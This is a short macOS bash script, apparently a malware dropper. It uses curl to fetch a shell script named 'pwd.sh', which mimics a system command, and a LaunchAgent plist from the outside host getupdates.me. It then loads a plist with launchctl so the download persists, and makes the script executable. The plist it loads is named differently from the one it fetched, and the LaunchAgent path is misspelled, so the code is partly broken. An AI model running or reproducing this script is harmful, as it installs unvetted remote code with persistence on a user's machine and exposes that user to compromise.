#!/bin/bash
cd /usr/local/bin/
curl -OL getupdates.me/pwd.sh
cd ~/Library/LaunchAgent/
curl -OL getupdates.me/com.local.pwd.plist
launchctl load ~/Library/LaunchAgent/com.local.cleanDesktop.plist
chmod +x /usr/local/bin/pwd.sh
